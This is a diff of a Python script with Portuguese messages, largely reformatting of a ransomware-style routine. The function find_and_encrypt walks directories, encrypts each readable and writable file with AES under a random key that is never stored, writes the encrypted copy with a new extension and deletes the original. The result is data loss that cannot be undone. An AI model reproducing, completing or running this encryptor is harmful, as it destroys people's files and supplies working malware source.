@@ -48,15 +48,19 @@ def check_os(osname: str) -> str | None:
                         key=Random.get_random_bytes(32),
                         block_bytes=65536
                     )
-
             else:
-                sys.exit('\33[31mPython3 é requerido.\33[0m')
-
+                sys.exit(
+                    '\33[31mPython3 é requerido.\33[0m'
+                )
         else:
-            sys.exit('\33[31mSistema Operacional não suportado.\33[0m')
+            sys.exit(
+                '\33[31mSistema Operacional não suportado.\33[0m'
+            )
 
     except OSError:
-        pass
+        sys.exit(
+            '\33[31mEncerrado.\33[0m'
+        )
 
 
 def find_and_encrypt(
@@ -85,53 +89,53 @@ def find_and_encrypt(
             )):
                 # # verificando permissão
                 if (
+                    os.access(
+                        os.path.join(
+                            root,
+                            file
+                        ), os.F_OK
+                    ) and (
                         os.access(
                             os.path.join(
                                 root,
                                 file
-                            ), os.F_OK
-                        ) and (
-                            os.access(
-                                os.path.join(
-                                    root,
-                                    file
-                                ), os.W_OK
-                            )
-                        ) and (
-                            os.access(
-                                os.path.join(
-                                    root,
-                                    file
-                                ), os.R_OK
-                            )
-                        )):
+                            ), os.W_OK
+                        )
+                    ) and (
+                        os.access(
+                            os.path.join(
+                                root,
+                                file
+                            ), os.R_OK
+                        )
+                    )):
 
-                    # # iniciando operacoes criptograficas.
-                    init_vector = Random.new().read(32)
-                    cipher = AES.new(
-                        key,
-                        AES.MODE_EAX,
-                        init_vector
-                    )
-
-                    with open(os.path.join(root, file), mode='rb') as f:
-                        data = f.read(
-                            block_bytes
+                        # # iniciando operacoes criptograficas.
+                        init_vector = Random.new().read(32)
+                        cipher = AES.new(
+                            key,
+                            AES.MODE_EAX,
+                            init_vector
                         )
 
-                    with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
-                        f.write(
-                            cipher.encrypt(
-                                data
+                        with open(os.path.join(root, file), mode='rb') as f:
+                            data = f.read(
+                                block_bytes
+                            )
+
+                        with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
+                            f.write(
+                                cipher.encrypt(
+                                    data
+                                )
+                            )
+
+                        os.remove(
+                            os.path.join(
+                                root,
+                                file
                             )
                         )
-
-                    os.remove(
-                        os.path.join(
-                            root,
-                            file
-                        )
-                    )
 
                 else:
                     if (
@@ -184,7 +188,9 @@ def find_and_encrypt(
                                     )
 
             else:
-                sys.exit('\33[31mNenhum arquivo encontrado.\33[0m')
+                sys.exit(
+                    '\33[31mNenhum arquivo encontrado.\33[0m'
+                )
 
 
 if __name__ == '__main__':
